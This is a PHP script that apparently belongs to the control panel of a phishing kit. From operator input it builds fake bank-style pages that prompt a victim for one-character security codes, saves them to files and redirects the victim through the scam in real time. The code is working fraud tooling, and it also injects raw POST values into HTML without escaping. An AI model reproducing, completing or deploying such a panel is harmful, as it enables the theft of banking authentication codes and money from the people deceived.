<?php


session_start();

if(isset($_POST['texttab'])) 
{


$Page .= ' <meta http-equiv="refresh" content="0;url=./tab.php" />  ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



if(isset($_POST['text1'])) {if ( $_POST['select1'] == "1") {

$textA .= '<span class="" style=""><input type="text" value="'.$_POST['text1'].'" name="nametext1" style="display:none;"><h style="font-size: 30px;color: #009f98;">'.$_POST['text1'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required name="codee1" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textAA = fopen("../Show_system/text1.txt", "w");
    fwrite($textAA, $textA);


}elseif ($_POST['select1'] == "2") {


$textA .= '<span class="" style=""><input type="text" value="'.$_POST['text1'].'" name="nametext1" style="display:none;"><h style="font-size: 30px;color: #009f98;">'.$_POST['text1'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required name="codee1" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textAA = fopen("../Show_system/text1.txt", "w");
    fwrite($textAA, $textA);


}elseif ($_POST['select1'] == "3") {



$textA .= '<span class="" style=""><input type="text" value="'.$_POST['text1'].'" name="nametext1" style="display:none;"><h style="font-size: 30px;color: #009f98;">'.$_POST['text1'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required name="codee1" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textAA = fopen("../Show_system/text1.txt", "w");
    fwrite($textAA, $textA);


}else {
    
$textA .= ' ';
$textAA = fopen("../Show_system/text1.txt", "w");
    fwrite($textAA, $textA);
}


}




if(isset($_POST['text2'])) {if ( $_POST['select2'] == "1") {
  


$textB .= '<span class="" style=""><input type="text" value="'.$_POST['text2'].'" name="nametext2" style="display:none;"><h style="font-size: 30px;color: #009f98;">'.$_POST['text2'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required name="codee2" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textBB = fopen("../Show_system/text2.txt", "w");
    fwrite($textBB, $textB);





}elseif ($_POST['select2'] == "2") {


$textB .= '<span class="" style=""><input type="text" value="'.$_POST['text2'].'" name="nametext2" style="display:none;"><h style="font-size: 30px;color: #009f98;">'.$_POST['text2'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required  name="codee2" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textBB = fopen("../Show_system/text2.txt", "w");
    fwrite($textBB, $textB);


}elseif ($_POST['select2'] == "3") {

   


$textB .= '<span class="" style=""><input type="text" value="'.$_POST['text2'].'" name="nametext2" style="display:none;">
<h style="font-size: 30px;color: #009f98;">'.$_POST['text2'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;
"></button></span><br><br><input id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  required name="codee2" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textBB = fopen("../Show_system/text2.txt", "w");
    fwrite($textBB, $textB);


}else {
    
$textB .= ' ';
$textBB = fopen("../Show_system/text2.txt", "w");
    fwrite($textBB, $textB);
}}




if(isset($_POST['text3'])) {if ( $_POST['select3'] == "1") {


$textC .= '
<span class="" style="">
<input type="text" value="'.$_POST['text3'].'" name="nametext3" style="display:none;">
<h style="font-size: 30px;color: #009f98;">'.$_POST['text3'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input required id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  name="codee3" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textCC = fopen("../Show_system/text3.txt", "w");
    fwrite($textCC, $textC);





}elseif ($_POST['select3'] == "2") {


$textC .= '<span class="" style="">
<input type="text" value="'.$_POST['text3'].'" name="nametext3" style="display:none;">
<h style="font-size: 30px;color: #009f98;">'.$_POST['text3'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;
"></button></span><br><br><input required id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  name="codee3" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textCC = fopen("../Show_system/text3.txt", "w");
    fwrite($textCC, $textC);


}elseif ($_POST['select3'] == "3") {



$textC .= '<span class="" style="">
<input type="text" value="'.$_POST['text3'].'" name="nametext3" style="display:none;">
<h style="font-size: 30px;color: #009f98;">'.$_POST['text3'].'</h><br><br><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;background-color: white;"></button></span><span style="padding: 3px;
"><button type="submit" class="cmp-button btn btn-primary" style="padding: 13px;height: initial;
"></button></span><br><br><input required id="adField" class="cmp-login-form__input_text form-control" type="text" placeholder="Código" minlength="1" maxlength="1"  name="codee3" autofocus="" style="background-color: #edf4f5;margin: auto;border: 0;border-bottom: 1px solid #808b94;font-size: 20px;font-weight: normal;font-stretch: normal;font-style: normal;line-height: 1;letter-spacing: 0px;text-align: center;color: #222;padding: 0px;border-radius: 0;"><div class="cmp-login__help_button"></div></span>';
$textCC = fopen("../Show_system/text3.txt", "w");
    fwrite($textCC, $textC);


}else {
    
$textC .= ' ';
$textCC = fopen("../Show_system/text3.txt", "w");
    fwrite($textCC, $textC);


}}




$Pag .= '<div class="expanded button-group" style="
    text-align: center;
"><input type="submit" value="✅ User go this Page tab 💯" class="btn nbl input-medium" style="
    background: #8bc34a;
"></div>';

$fPag = fopen("../Show_system/Show_Select.txt", "w");
    fwrite($fPag, $Pag);


header("location:../Select.php");

}



else {




}

?>
